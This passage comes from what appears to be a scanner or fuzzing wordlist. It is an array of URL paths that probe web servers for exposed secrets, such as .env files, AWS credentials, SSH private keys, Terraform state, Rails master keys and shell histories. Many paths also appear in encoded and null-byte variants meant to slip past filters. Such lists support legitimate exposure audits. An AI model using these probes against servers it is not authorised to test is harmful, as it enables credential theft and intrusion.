	"/%2frelease%5finfo%2ephp",
	"/%252frelease%255finfo%252ephp",
	"/release%5finfo.%00php",
	"/test/info.php",
	"/%2ftest%2finfo%2ephp",
	"/%252ftest%252finfo%252ephp",
	"/test/%00info.php",
	"/info",
	"/%2finfo",
	"/%252finfo",
	"/info%00",
	"/%2finfo%2ephp",
	"/%252finfo%252ephp",
	"/info.%00php",
	"/phpinfo.php3",
	"/%2fphpinfo%2ephp3",
	"/%252fphpinfo%252ephp3",
	"/phpinfo.%00php3",
	"/phpinfo.php.txt",
	"/%2fphpinfo%2ephp%2etxt",
	"/%252fphpinfo%252ephp%252etxt",
	"/phpinfo.%00php.txt",
	"/info.php.save.1",
	"/%2finfo%2ephp%2esave%2e1",
	"/%252finfo%252ephp%252esave%252e1",
	"/info.%00php.save.1",
	"/info-php-",
	"/%2finfo%2dphp%2d",
	"/%252finfo%252dphp%252d",
	"/info%2dphp%2d%00",
	"/_info.php",
	"/%5finfo%2ephp",
	"/%255finfo%252ephp",
	"/_info.%00php",
	"/admin_phpinfo.php",
	"/%2fadmin%5fphpinfo%2ephp",
	"/%252fadmin%255fphpinfo%252ephp",
	"/admin%5fphpinfo.%00php",
	"/dbinfo.php",
	"/%2fdbinfo%2ephp",
	"/%252fdbinfo%252ephp",
	"/dbinfo.%00php",
	"/admin_info.php",
	"/%2fadmin%5finfo%2ephp",
	"/%252fadmin%255finfo%252ephp",
	"/admin%5finfo.%00php",
	"/config-php",
	"/%2fconfig%2dphp",
	"/%252fconfig%252dphp",
	"/config%2dphp%00",
	"/phpinfo.php.bak",
	"/%2fphpinfo%2ephp%2ebak",
	"/%252fphpinfo%252ephp%252ebak",
	"/phpinfo.%00php.bak",
	"/admin/admin_phpinfo.php4",
	"/%2fadmin%2fadmin%5fphpinfo%2ephp4",
	"/%252fadmin%252fadmin%255fphpinfo%252ephp4",
	"/admin/admin%5fphpinfo.%00php4",
	"/pinfo.php",
	"/%2fpinfo%2ephp",
	"/%252fpinfo%252ephp",
	"/pinfo.%00php",
	"/.env.bak",
	"/.env.production.local",
	"/%2f%2eenv%2eproduction%2elocal",
	"/%252f%252eenv%252eproduction%252elocal",
	"/.%00env.production.local",
	"/sendinblue_settings.py",
	"/%2fsendinblue%5fsettings%2epy",
	"/%252fsendinblue%255fsettings%252epy",
	"/sendinblue%5fsettings.%00py",
	"/%252f%252eaws%252fcredentials",
	"/.aws/%00credentials",
	"/workspace/.aws/credentials",
	"/.aws/config.bak",
	"/.aws/config.old",
	"/.aws/config.temp",
	"/.aws/config.txt",
	"/.aws/credentials.bak",
	"/.aws/credentials.old",
	"/.aws/credentials.temp",
	"/.aws/credentials.txt",
	"/.s3cfg.bak",
	"/.s3cfg.old",
	"/.s3cfg.temp",
	"/.s3cfg.txt",
	"/backup/.aws/config",
	"/backup/.aws/config.bak",
	"/backup/.aws/config.old",
	"/backup/.aws/config.temp",
	"/backup/.aws/config.txt",
	"/backup/.aws/credentials",
	"/backup/.aws/credentials.bak",
	"/backup/.aws/credentials.old",
	"/backup/.aws/credentials.temp",
	"/backup/.aws/credentials.txt",
	"/backup/.s3cfg",
	"/backup/.s3cfg.bak",
	"/backup/.s3cfg.old",
	"/backup/.s3cfg.temp",
	"/backup/.s3cfg.txt",
	"/backup/terraform.tfstate",
	"/backup/terraform.tfstate.bak",
	"/backup/terraform.tfstate.old",
	"/backup/terraform.tfstate.php.bak",
	"/backup/terraform.tfstate.temp",
	"/backup/terraform.tfstate.txt",
	"/backup/terraform.tfvars",
	"/backup/terraform.tfvars.bak",
	"/backup/terraform.tfvars.old",
	"/backup/terraform.tfvars.php.bak",
	"/backup/terraform.tfvars.temp",
	"/backup/terraform.tfvars.txt",
	"/dev/.aws/config",
	"/dev/.aws/config.bak",
	"/dev/.aws/config.old",
	"/dev/.aws/config.temp",
	"/dev/.aws/config.txt",
	"/dev/.aws/credentials",
	"/dev/.aws/credentials.bak",
	"/dev/.aws/credentials.old",
	"/dev/.aws/credentials.temp",
	"/dev/.aws/credentials.txt",
	"/dev/.s3cfg",
	"/dev/.s3cfg.bak",
	"/dev/.s3cfg.old",
	"/dev/.s3cfg.temp",
	"/dev/.s3cfg.txt",
	"/dev/terraform.tfstate",
	"/dev/terraform.tfstate.bak",
	"/dev/terraform.tfstate.old",
	"/dev/terraform.tfstate.php.bak",
	"/dev/terraform.tfstate.temp",
	"/dev/terraform.tfstate.txt",
	"/dev/terraform.tfvars",
	"/dev/terraform.tfvars.bak",
	"/dev/terraform.tfvars.old",
	"/dev/terraform.tfvars.php.bak",
	"/dev/terraform.tfvars.temp",
	"/dev/terraform.tfvars.txt",
	"/old/.aws/config",
	"/old/.aws/config.bak",
	"/old/.aws/config.old",
	"/old/.aws/config.temp",
	"/old/.aws/config.txt",
	"/old/.aws/credentials",
	"/old/.aws/credentials.bak",
	"/old/.aws/credentials.old",
	"/old/.aws/credentials.temp",
	"/old/.aws/credentials.txt",
	"/old/.s3cfg",
	"/old/.s3cfg.bak",
	"/old/.s3cfg.old",
	"/old/.s3cfg.temp",
	"/old/.s3cfg.txt",
	"/old/terraform.tfstate",
	"/old/terraform.tfstate.bak",
	"/old/terraform.tfstate.old",
	"/old/terraform.tfstate.php.bak",
	"/old/terraform.tfstate.temp",
	"/old/terraform.tfstate.txt",
	"/old/terraform.tfvars",
	"/old/terraform.tfvars.bak",
	"/old/terraform.tfvars.old",
	"/old/terraform.tfvars.php.bak",
	"/old/terraform.tfvars.temp",
	"/old/terraform.tfvars.txt",
	"/temp/.aws/config",
	"/temp/.aws/config.bak",
	"/temp/.aws/config.old",
	"/temp/.aws/config.temp",
	"/temp/.aws/config.txt",
	"/temp/.aws/credentials",
	"/temp/.aws/credentials.bak",
	"/temp/.aws/credentials.old",
	"/temp/.aws/credentials.temp",
	"/temp/.aws/credentials.txt",
	"/temp/.s3cfg",
	"/temp/.s3cfg.bak",
	"/temp/.s3cfg.old",
	"/temp/.s3cfg.temp",
	"/temp/.s3cfg.txt",
	"/temp/terraform.tfstate",
	"/temp/terraform.tfstate.bak",
	"/temp/terraform.tfstate.old",
	"/temp/terraform.tfstate.php.bak",
	"/temp/terraform.tfstate.temp",
	"/temp/terraform.tfstate.txt",
	"/temp/terraform.tfvars",
	"/temp/terraform.tfvars.bak",
	"/temp/terraform.tfvars.old",
	"/temp/terraform.tfvars.php.bak",
	"/temp/terraform.tfvars.temp",
	"/temp/terraform.tfvars.txt",
	"/terraform.tfstate.bak",
	"/terraform.tfstate.old",
	"/terraform.tfstate.php.bak",
	"/terraform.tfstate.temp",
	"/terraform.tfstate.txt",
	"/terraform.tfvars.bak",
	"/terraform.tfvars.old",
	"/terraform.tfvars.php.bak",
	"/terraform.tfvars.temp",
	"/terraform.tfvars.txt",
	"/.env.local.bak",
	"/.env.local.old",
	"/.env.local.temp",
	"/.env.local.txt",
	"/.env.php.bak",
	"/.env.production.bak",
	"/.env.production.old",
	"/.env.production.temp",
	"/.env.production.txt",
	"/.env.temp",
	"/.env.txt",
	"/backup/.env",
	"/backup/.env.bak",
	"/backup/.env.local",
	"/backup/.env.local.bak",
	"/backup/.env.local.old",
	"/backup/.env.local.temp",
	"/backup/.env.local.txt",
	"/backup/.env.old",
	"/backup/.env.php.bak",
	"/backup/.env.production",
	"/backup/.env.production.bak",
	"/backup/.env.production.old",
	"/backup/.env.production.temp",
	"/backup/.env.production.txt",
	"/backup/.env.temp",
	"/backup/.env.txt",
	"/backup/config/master.key",
	"/backup/config/master.key.bak",
	"/backup/config/master.key.old",
	"/backup/config/master.key.php.bak",
	"/backup/config/master.key.temp",
	"/backup/config/master.key.txt",
	"/backup/config/settings.json",
	"/backup/config/settings.json.bak",
	"/backup/config/settings.json.old",
	"/backup/config/settings.json.php.bak",
	"/backup/config/settings.json.temp",
	"/backup/config/settings.json.txt",
	"/config/master.key",
	"/config/master.key.bak",
	"/config/master.key.old",
	"/config/master.key.php.bak",
	"/config/master.key.temp",
	"/config/master.key.txt",
	"/config/settings.json",
	"/config/settings.json.bak",
	"/config/settings.json.old",
	"/config/settings.json.php.bak",
	"/config/settings.json.temp",
	"/config/settings.json.txt",
	"/dev/.env.bak",
	"/dev/.env.local",
	"/dev/.env.local.bak",
	"/dev/.env.local.old",
	"/dev/.env.local.temp",
	"/dev/.env.local.txt",
	"/dev/.env.old",
	"/dev/.env.php.bak",
	"/dev/.env.production",
	"/dev/.env.production.bak",
	"/dev/.env.production.old",
	"/dev/.env.production.temp",
	"/dev/.env.production.txt",
	"/dev/.env.temp",
	"/dev/.env.txt",
	"/dev/config/master.key",
	"/dev/config/master.key.bak",
	"/dev/config/master.key.old",
	"/dev/config/master.key.php.bak",
	"/dev/config/master.key.temp",
	"/dev/config/master.key.txt",
	"/dev/config/settings.json",
	"/dev/config/settings.json.bak",
	"/dev/config/settings.json.old",
	"/dev/config/settings.json.php.bak",
	"/dev/config/settings.json.temp",
	"/dev/config/settings.json.txt",
	"/old/.env",
	"/old/.env.bak",
	"/old/.env.local",
	"/old/.env.local.bak",
	"/old/.env.local.old",
	"/old/.env.local.temp",
	"/old/.env.local.txt",
	"/old/.env.old",
	"/old/.env.php.bak",
	"/old/.env.production",
	"/old/.env.production.bak",
	"/old/.env.production.old",
	"/old/.env.production.temp",
	"/old/.env.production.txt",
	"/old/.env.temp",
	"/old/.env.txt",
	"/old/config/master.key",
	"/old/config/master.key.bak",
	"/old/config/master.key.old",
	"/old/config/master.key.php.bak",
	"/old/config/master.key.temp",
	"/old/config/master.key.txt",
	"/old/config/settings.json",
	"/old/config/settings.json.bak",
	"/old/config/settings.json.old",
	"/old/config/settings.json.php.bak",
	"/old/config/settings.json.temp",
	"/old/config/settings.json.txt",
	"/temp/.env",
	"/temp/.env.bak",
	"/temp/.env.local",
	"/temp/.env.local.bak",
	"/temp/.env.local.old",
	"/temp/.env.local.temp",
	"/temp/.env.local.txt",
	"/temp/.env.old",
	"/temp/.env.php.bak",
	"/temp/.env.production",
	"/temp/.env.production.bak",
	"/temp/.env.production.old",
	"/temp/.env.production.temp",
	"/temp/.env.production.txt",
	"/temp/.env.temp",
	"/temp/.env.txt",
	"/temp/config/master.key",
	"/temp/config/master.key.bak",
	"/temp/config/master.key.old",
	"/temp/config/master.key.php.bak",
	"/temp/config/master.key.temp",
	"/temp/config/master.key.txt",
	"/temp/config/settings.json",
	"/temp/config/settings.json.bak",
	"/temp/config/settings.json.old",
	"/temp/config/settings.json.php.bak",
	"/temp/config/settings.json.temp",
	"/temp/config/settings.json.txt",
	"/backup/netlify.toml",
	"/backup/netlify.toml.bak",
	"/backup/netlify.toml.old",
	"/backup/netlify.toml.php.bak",
	"/backup/netlify.toml.temp",
	"/backup/netlify.toml.txt",
	"/backup/next.config.js",
	"/backup/next.config.js.bak",
	"/backup/next.config.js.old",
	"/backup/next.config.js.temp",
	"/backup/next.config.js.txt",
	"/backup/package.json",
	"/backup/package.json.bak",
	"/backup/package.json.old",
	"/backup/package.json.php.bak",
	"/backup/package.json.temp",
	"/backup/package.json.txt",
	"/backup/serverless.yml",
	"/backup/serverless.yml.bak",
	"/backup/serverless.yml.old",
	"/backup/serverless.yml.php.bak",
	"/backup/serverless.yml.temp",
	"/backup/serverless.yml.txt",
	"/backup/vercel.json",
	"/backup/vercel.json.bak",
	"/backup/vercel.json.old",
	"/backup/vercel.json.php.bak",
	"/backup/vercel.json.temp",
	"/backup/vercel.json.txt",
	"/dev/netlify.toml",
	"/dev/netlify.toml.bak",
	"/dev/netlify.toml.old",
	"/dev/netlify.toml.php.bak",
	"/dev/netlify.toml.temp",
	"/dev/netlify.toml.txt",
	"/dev/next.config.js",
	"/dev/next.config.js.bak",
	"/dev/next.config.js.old",
	"/dev/next.config.js.temp",
	"/dev/next.config.js.txt",
	"/dev/package.json",
	"/dev/package.json.bak",
	"/dev/package.json.old",
	"/dev/package.json.php.bak",
	"/dev/package.json.temp",
	"/dev/package.json.txt",
	"/dev/serverless.yml",
	"/dev/serverless.yml.bak",
	"/dev/serverless.yml.old",
	"/dev/serverless.yml.php.bak",
	"/dev/serverless.yml.temp",
	"/dev/serverless.yml.txt",
	"/dev/vercel.json",
	"/dev/vercel.json.bak",
	"/dev/vercel.json.old",
	"/dev/vercel.json.php.bak",
	"/dev/vercel.json.temp",
	"/dev/vercel.json.txt",
	"/netlify.toml",
	"/netlify.toml.bak",
	"/netlify.toml.old",
	"/netlify.toml.php.bak",
	"/netlify.toml.temp",
	"/netlify.toml.txt",
	"/next.config.js",
	"/next.config.js.bak",
	"/next.config.js.old",
	"/next.config.js.temp",
	"/next.config.js.txt",
	"/old/netlify.toml",
	"/old/netlify.toml.bak",
	"/old/netlify.toml.old",
	"/old/netlify.toml.php.bak",
	"/old/netlify.toml.temp",
	"/old/netlify.toml.txt",
	"/old/next.config.js",
	"/old/next.config.js.bak",
	"/old/next.config.js.old",
	"/old/next.config.js.temp",
	"/old/next.config.js.txt",
	"/old/package.json",
	"/old/package.json.bak",
	"/old/package.json.old",
	"/old/package.json.php.bak",
	"/old/package.json.temp",
	"/old/package.json.txt",
	"/old/serverless.yml",
	"/old/serverless.yml.bak",
	"/old/serverless.yml.old",
	"/old/serverless.yml.php.bak",
	"/old/serverless.yml.temp",
	"/old/serverless.yml.txt",
	"/old/vercel.json",
	"/old/vercel.json.bak",
	"/old/vercel.json.old",
	"/old/vercel.json.php.bak",
	"/old/vercel.json.temp",
	"/old/vercel.json.txt",
	"/package.json",
	"/package.json.bak",
	"/package.json.old",
	"/package.json.php.bak",
	"/package.json.temp",
	"/package.json.txt",
	"/serverless.yml.bak",
	"/serverless.yml.old",
	"/serverless.yml.php.bak",
	"/serverless.yml.temp",
	"/serverless.yml.txt",
	"/temp/netlify.toml",
	"/temp/netlify.toml.bak",
	"/temp/netlify.toml.old",
	"/temp/netlify.toml.php.bak",
	"/temp/netlify.toml.temp",
	"/temp/netlify.toml.txt",
	"/temp/next.config.js",
	"/temp/next.config.js.bak",
	"/temp/next.config.js.old",
	"/temp/next.config.js.temp",
	"/temp/next.config.js.txt",
	"/temp/package.json",
	"/temp/package.json.bak",
	"/temp/package.json.old",
	"/temp/package.json.php.bak",
	"/temp/package.json.temp",
	"/temp/package.json.txt",
	"/temp/serverless.yml",
	"/temp/serverless.yml.bak",
	"/temp/serverless.yml.old",
	"/temp/serverless.yml.php.bak",
	"/temp/serverless.yml.temp",
	"/temp/serverless.yml.txt",
	"/temp/vercel.json",
	"/temp/vercel.json.bak",
	"/temp/vercel.json.old",
	"/temp/vercel.json.php.bak",
	"/temp/vercel.json.temp",
	"/temp/vercel.json.txt",
	"/vercel.json.bak",
	"/vercel.json.old",
	"/vercel.json.php.bak",
	"/vercel.json.temp",
	"/vercel.json.txt",
	"/_next/static/chunks/main.js",
	"/_next/static/chunks/main.js.bak",
	"/_next/static/chunks/main.js.old",
	"/_next/static/chunks/main.js.php.bak",
	"/_next/static/chunks/main.js.temp",
	"/_next/static/chunks/main.js.txt",
	"/app.js.map",
	"/backup/_next/static/chunks/main.js",
	"/backup/_next/static/chunks/main.js.bak",
	"/backup/_next/static/chunks/main.js.old",
	"/backup/_next/static/chunks/main.js.php.bak",
	"/backup/_next/static/chunks/main.js.temp",
	"/backup/_next/static/chunks/main.js.txt",
	"/bundle.js.map",
	"/dev/_next/static/chunks/main.js",
	"/dev/_next/static/chunks/main.js.bak",
	"/dev/_next/static/chunks/main.js.old",
	"/dev/_next/static/chunks/main.js.php.bak",
	"/dev/_next/static/chunks/main.js.temp",
	"/dev/_next/static/chunks/main.js.txt",
	"/main.js.map",
	"/old/_next/static/chunks/main.js",
	"/old/_next/static/chunks/main.js.bak",
	"/old/_next/static/chunks/main.js.old",
	"/old/_next/static/chunks/main.js.php.bak",
	"/old/_next/static/chunks/main.js.temp",
	"/old/_next/static/chunks/main.js.txt",
	"/temp/_next/static/chunks/main.js",
	"/temp/_next/static/chunks/main.js.bak",
	"/temp/_next/static/chunks/main.js.old",
	"/temp/_next/static/chunks/main.js.php.bak",
	"/temp/_next/static/chunks/main.js.temp",
	"/temp/_next/static/chunks/main.js.txt",
	"/%2eenv.bak",
	"/%2f%2eenv.bak",
	"/%62ackend/%2eenv.bak",
	"/_api/v1/debug",
	"/_api/v1/debug.bak",
	"/_api/v1/debug.old",
	"/_api/v1/debug.php.bak",
	"/_api/v1/debug.temp",
	"/_api/v1/debug.txt",
	"/backup/_api/v1/debug",
	"/backup/_api/v1/debug.bak",
	"/backup/_api/v1/debug.old",
	"/backup/_api/v1/debug.php.bak",
	"/backup/_api/v1/debug.temp",
	"/backup/_api/v1/debug.txt",
	"/backup/dnscfg.cgi",
	"/backup/dnscfg.cgi.bak",
	"/backup/dnscfg.cgi.old",
	"/backup/dnscfg.cgi.php.bak",
	"/backup/dnscfg.cgi.temp",
	"/backup/dnscfg.cgi.txt",
	"/dev/_api/v1/debug",
	"/dev/_api/v1/debug.bak",
	"/dev/_api/v1/debug.old",
	"/dev/_api/v1/debug.php.bak",
	"/dev/_api/v1/debug.temp",
	"/dev/_api/v1/debug.txt",
	"/dev/dnscfg.cgi",
	"/dev/dnscfg.cgi.bak",
	"/dev/dnscfg.cgi.old",
	"/dev/dnscfg.cgi.php.bak",
	"/dev/dnscfg.cgi.temp",
	"/dev/dnscfg.cgi.txt",
	"/dnscfg.cgi.bak",
	"/dnscfg.cgi.old",
	"/dnscfg.cgi.php.bak",
	"/dnscfg.cgi.temp",
	"/dnscfg.cgi.txt",
	"/old/_api/v1/debug",
	"/old/_api/v1/debug.bak",
	"/old/_api/v1/debug.old",
	"/old/_api/v1/debug.php.bak",
	"/old/_api/v1/debug.temp",
	"/old/_api/v1/debug.txt",
	"/old/dnscfg.cgi",
	"/old/dnscfg.cgi.bak",
	"/old/dnscfg.cgi.old",
	"/old/dnscfg.cgi.php.bak",
	"/old/dnscfg.cgi.temp",
	"/old/dnscfg.cgi.txt",
	"/temp/_api/v1/debug",
	"/temp/_api/v1/debug.bak",
	"/temp/_api/v1/debug.old",
	"/temp/_api/v1/debug.php.bak",
	"/temp/_api/v1/debug.temp",
	"/temp/_api/v1/debug.txt",
	"/temp/dnscfg.cgi",
	"/temp/dnscfg.cgi.bak",
	"/temp/dnscfg.cgi.old",
	"/temp/dnscfg.cgi.php.bak",
	"/temp/dnscfg.cgi.temp",
	"/temp/dnscfg.cgi.txt",
	"/.env.save",
	"/.env.tmp",
	"/.boto.bak",
	"/docker-compose.yml.bak",
	"/.amplifyrc.bak",
	"/.env.staging",
	"/.env.dev.bak",
	"/.env.dev.old",
	"/.env.local.save",
	"/.env.production.save",
	"/.env.local.tmp",
	"/.env.production.tmp",
	"/.aws/credentials.example",
	"/.aws/config.example",
	"/.s3cfg.example",
	"/.boto.txt",
	"/.boto.example",
	"/config/database.yml",
	"/docker-compose.override.yml",
	"/web.config",
	"/app.config",
	"/auth.json",
	"/credentials.json",
	"/client_secret.json",
	"/.npmrc",
	"/.ssh/id_rsa",
	"/.ssh/config",
	"/id_rsa",
	"/id_rsa.bak",
	"/.history",
	"/.bash_history",
	"/.zsh_history",
	"/access.log",
	"/error.log",
	"/debug.log",
	"/storage/logs/laravel.log",
	"/writable/debug.log",
	"/app/.env.bak",
	"/app/.env.old",
	"/app/.env.dev",
	"/app/.env.example",
	"/app/.aws/credentials",
	"/app/.aws/config",
	"/app/.aws/credentials.bak",
	"/app/.aws/config.bak",
	"/app/config/master.key",
	"/app/config/settings.json",
	"/var/task/.env",
	"/var/task/.env.local",
	"/var/task/.env.production",
	"/var/task/.env.bak",
	"/var/task/.env.old",
	"/var/task/.aws/credentials",
	"/var/task/.aws/config",
	"/var/task/.aws/credentials.bak",
	"/var/task/terraform.tfstate",
	"/var/task/.amplifyrc",
	"/var/task/.boto",
	"/app/.s3cfg",
	"/app/.boto",
	"/app/.amplifyrc",
	"/app/dnscfg.cgi",
	"/app/_api/v1/debug",
	"/var/task/config/master.key",
	"/var/task/config/settings.json",
	"/app/.env.test",
	"/app/.env.staging",
	"/app/.env.save",
	"/app/.env.tmp",
	"/app/.env.txt",
	"/var/task/.env.txt",
	"/var/task/.env.save",
	"/app/.aws/credentials.txt",
	"/app/.aws/config.txt",
	"/var/task/.aws/credentials.txt",
	"/var/task/.aws/config.txt",
	"/app/config/database.yml",
	"/app/config/secrets.yml",
	"/var/task/config/database.yml",
	"/app/docker-compose.override.yml",
	"/app/Dockerfile",
	"/var/task/Dockerfile",
	"/app/.dockerignore",
	"/app/.gitignore",
	"/var/task/.gitignore",
	"/app/vendor/composer/installed.json",
	"/app/composer.json",
	"/var/task/composer.json",
	"/app/main.js.map",
	"/var/task/main.js.map",
	"/app/.env.dev.bak",
	"/app/.env.local.bak",
	"/var/task/.env.local.bak",
	"/app/.aws/credentials.example",
	"/var/task/.aws/credentials.example",
	"/app/terraform.tfvars",
	"/var/task/terraform.tfvars",
	"/app/.terraform.lock.hcl",
	"/app/.node_repl_history",
	"/app/npm-debug.log",
	"/var/task/npm-debug.log",
	"/app/yarn.lock",
	"/var/task/yarn.lock",
	"/app/package-lock.json",
	"/app/.npmrc",
	"/var/task/.npmrc",
	"/app/.editorconfig",
	"/app/phpinfo.php",
	"/var/task/phpinfo.php",
	"/app/wp-config.php",
	"/app/config.php",
	"/app/settings.py",
	"/app/manage.py",
	"/app/web.config",
	"/app/.htaccess",
	"/app/web.xml",
	"/app/config.xml",
	"/app/log.txt",
	"/app/error_log",
	"/.config/.env",
	"/.config/.env.local",
	"/.config/.env.production",
	"/.config/.aws/credentials",
	"/.config/.aws/config",
	"/.config/config/master.key",
	"/.config/docker-compose.yml",
	"/.config/terraform.tfstate",
	"/.config/.s3cfg",
	"/.config/.boto",
	"/backup/docker-compose.yml",
	"/old/docker-compose.yml",
	"/conf/.env.local",
	"/conf/.aws/credentials",
	"/conf/.aws/config",
	"/conf/config/master.key",
	"/conf/serverless.yml",
	"/conf/docker-compose.yml",
	"/local/.env",
	"/local/.env.local",
	"/local/.aws/credentials",
	"/local/.aws/config",
	"/local/package.json",
	"/src/.env",
	"/src/.env.local",
	"/src/.aws/credentials",
	"/src/config/master.key",
	"/test/.env",
	"/test/.aws/credentials",
	"/.config/.env.bak",
	"/.config/.env.old",
	"/conf/.env.bak",
	"/.config/.aws/credentials.bak",
	"/.config/package.json.bak",
	"/.config/terraform.tfvars",
	"/.config/vercel.json",
	"/conf/netlify.toml",
	"/.config/serverless.yml",
	"/conf/next.config.js",
	"/.config/next.config.js.bak",
	"/.config/dnscfg.cgi",
	"/conf/dnscfg.cgi",
	"/.config/_api/v1/debug",
	"/.config/.amplifyrc",
	"/backup/.amplifyrc",
	"/.config/.boto.bak",
	"/backup/.boto.bak",
	"/old/.boto",
	"/local/.boto",
	"/src/.boto",
	"/temp/.boto",
	"/test/.boto",
	"/conf/.boto",
	"/.config/.s3cfg.bak",
	"/local/.s3cfg",
	"/conf/.s3cfg",
	"/.env.bak.txt",
	"/.aws/credentials.save",
	"/.aws/credentials.tmp",
	"/.aws/config.save",
	"/.aws/config.tmp",
	"/.s3cfg.save",
	"/.s3cfg.tmp",
	"/.boto.save",
	"/.boto.tmp",
	"/var/task/.env.tmp",
	"/var/task/next.config.js.bak",
	"/var/task/next.config.js.old",
	"/var/task/package.json.bak",
	"/var/task/serverless.yml.bak",
	"/.config/.env.save",
	"/.config/.env.tmp",
	"/backup/.env.save",
	"/backup/.env.tmp",
	"/old/.env.save",
	"/old/.env.tmp",
	"/conf/.env.save",
	"/conf/.env.tmp",
	"/local/.env.save",
	"/local/.env.tmp",
	"/.amplifyrc.save",
	"/.amplifyrc.tmp",
	"/app/.amplifyrc.save",
	"/var/task/.amplifyrc.save",
	"/config/master.key.save",
	"/config/master.key.tmp",
	"/app/config/master.key.bak",
	"/app/config/master.key.save",
	"/terraform.tfstate.save",
	"/terraform.tfstate.tmp",
	"/terraform.tfvars.save",
	"/terraform.tfvars.tmp",
	"/docker-compose.yml.save",
	"/docker-compose.yml.tmp",
	"/next.config.js.save",
	"/next.config.js.tmp",
	"/package.json.save",
	"/package.json.tmp",
	"/vercel.json.save",
	"/vercel.json.tmp",
	"/netlify.toml.save",
	"/netlify.toml.tmp",
	"/serverless.yml.save",
	"/serverless.yml.tmp",
	"/dnscfg.cgi.save",
	"/dnscfg.cgi.tmp",
	"/_api/v1/debug.save",
	"/_api/v1/debug.tmp",
	"/app/_api/v1/debug.bak",
	"/app/dnscfg.cgi.bak",
	"/app/package.json.bak",
	"/app/next.config.js.bak",
	"/app/serverless.yml.bak",
	"/app/vercel.json.bak",
	"/app/terraform.tfstate.bak",
	"/app/terraform.tfvars.bak",
	"/app/.boto.bak",
	"/app/.s3cfg.bak",
	"/var/task/.boto.bak",
	"/var/task/.s3cfg.bak",
	"/var/task/terraform.tfstate.save",
	"/var/task/terraform.tfvars.save",
	"/var/task/vercel.json.save",
	"/var/task/package.json.save",
	"/var/task/next.config.js.save",
	"/var/task/serverless.yml.save",
	"/var/task/netlify.toml.save",
	"/.config/.aws/credentials.save",
	"/.config/.aws/config.save",
	"/backup/.aws/credentials.save",
	"/backup/.aws/config.save",
	"/conf/.aws/credentials.save",
	"/conf/.aws/config.save",
	"/local/.aws/credentials.save",
	"/local/.aws/config.save",
	"/src/.aws/credentials.save",
	"/src/.aws/config.save",
	"/test/.aws/credentials.save",
	"/test/.aws/config.save",
	"/temp/.aws/credentials.save",
	"/temp/.aws/config.save",
	"/.amplifyrc.example",
	"/var/task/.env.example",
	"/var/task/next.config.js.example",
	"/var/task/package.json.example",
	"/var/task/serverless.yml.example",
	"/config/master.key.example",
	"/config/settings.json.example",
	"/terraform.tfstate.example",
	"/terraform.tfvars.example",
	"/docker-compose.yml.example",
	"/.config/.env.txt",
	"/src/.env.bak",
	"/src/.env.old",
	"/src/.env.save",
	"/src/.env.tmp",
	"/src/.aws/credentials.bak",
	"/local/.env.bak",
	"/local/.env.old",
	"/local/.aws/credentials.bak",
	"/test/.env.bak",
	"/test/.env.old",
	"/test/.aws/credentials.bak",
	"/app/config/settings.json.bak",
	"/app/next.config.js.old",
	"/app/package.json.old",
	"/app/serverless.yml.old",
	"/app/vercel.json.old",
	"/var/task/next.config.js.txt",
	"/var/task/package.json.txt",
	"/var/task/serverless.yml.txt",
	"/var/task/netlify.toml.txt",
	"/var/task/vercel.json.txt",
	"/var/task/terraform.tfstate.txt",
	"/var/task/terraform.tfvars.txt",
	"/.config/.amplifyrc.txt",
	"/.config/.boto.txt",
	"/.config/.s3cfg.txt",
	"/backup/.amplifyrc.txt",
	"/backup/.boto.txt",
	"/old/docker-compose.yml.txt",
	"/conf/.env.txt",
	"/conf/.aws/credentials.txt",
	"/conf/serverless.yml.txt",
	"/conf/next.config.js.txt",
	"/local/.env.txt",
	"/local/.aws/credentials.txt",
	"/local/package.json.txt",
	"/src/.env.txt",
	"/src/.aws/credentials.txt",
	"/src/package.json.txt",
	"/test/.env.txt",
	"/test/.aws/credentials.txt",
	"/.config/config/master.key.txt",
	"/app/config/master.key.txt",
	"/var/task/config/master.key.txt",
	"/.config/config/settings.json.txt",
	"/app/config/settings.json.txt",
	"/var/task/config/settings.json.txt",
	"/app/next.config.js.tmp",
	"/app/package.json.tmp",
	"/app/serverless.yml.tmp",
	"/app/vercel.json.tmp",
	"/app/terraform.tfstate.tmp",
	"/src/config/database.yml",
	"/src/config/secrets.yml",
	"/src/config/settings.json",
	"/src/docker-compose.yml",
	"/src/serverless.yml",
	"/src/terraform.tfvars",
	"/local/config/master.key",
	"/local/config/settings.json",
	"/local/docker-compose.yml",
	"/local/terraform.tfstate",
	"/.terraform/providers/registry.terraform.io/credentials",
	"/.terraform/terraform.tfstate",
	"/test/config/master.key",
	"/test/docker-compose.yml",
	"/test/package.json",
	"/temp/docker-compose.yml",
	"/conf/config/settings.json",
	"/conf/terraform.tfstate",
	"/conf/terraform.tfvars",
	"/backup/config/database.yml",
	"/backup/config/secrets.yml",
	"/.config/config/database.yml",
	"/.config/config/secrets.yml",
	"/var/task/config/secrets.yml",
	"/app/config/database.yml.bak",
	"/app/config/secrets.yml.bak",
	"/src/.env.example",
	"/local/.env.example",
	"/test/.env.example",
	"/conf/.env.example",
	"/var/task/.env.dev",
	"/app/.env.staging.bak",
	"/app/.env.live.bak",
	"/.env.bak.old",
	"/.env.old.bak",
	"/.env.old.txt",
	"/.env.db",
	"/.env.database",
	"/.env.php",
	"/.env.js",
	"/config.env",
	"/src/config.env",
	"/app/config.env",
	"/.env.orig",
	"/.env.original",
	"/backup/.env.original",
	"/old/.env.original",
	"/var/task/.env.original",
	"/storage/logs/laravel.log.bak",
	"/storage/logs/laravel.log.old",
	"/logs/access.log",
	"/logs/error.log",
	"/logs/api.log",
	"/logs/debug.log",
	"/logs/aws.log",
	"/logs/s3.log",
	"/var/log/apache2/access.log",
	"/var/log/nginx/access.log",
	"/var/log/app.log",
	"/var/log/env.log",
	"/app/logs/error.log",
	"/app/logs/access.log",
	"/var/task/logs/error.log",
	"/var/task/logs/access.log",
	"/.aws/credentials.old.txt",
	"/.aws/config.old.txt",
	"/.s3cfg.old.txt",
	"/.boto.old.txt",
	"/app/.aws/credentials.old",
	"/app/.aws/config.old",
	"/var/task/.aws/credentials.old",
	"/var/task/.aws/config.old",
	"/local/.aws/credentials.old",
	"/.config/.aws/credentials.old",
	"/conf/.aws/credentials.old",
	"/app/config/settings.json.old",
	"/var/task/config/settings.json.bak",
	"/var/task/config/settings.json.old",
	"/src/config/settings.json.bak",
	"/local/config/settings.json.bak",
	"/.config/config/settings.json.bak",
	"/app/next.config.js.txt",
	"/app/package.json.txt",
	"/app/serverless.yml.txt",
	"/app/vercel.json.txt",
	"/app/netlify.toml.txt",
	"/app/terraform.tfstate.txt",
	"/app/terraform.tfvars.txt",
